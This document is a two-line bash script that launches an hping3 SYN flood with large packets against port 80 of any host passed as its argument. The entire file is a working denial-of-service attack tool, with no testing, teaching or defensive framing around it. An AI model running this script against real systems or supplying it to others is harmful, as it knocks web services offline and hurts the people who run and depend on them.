#!/bin/bash
hping3 -S --flood -V -d 1460 -p 80 "$1"
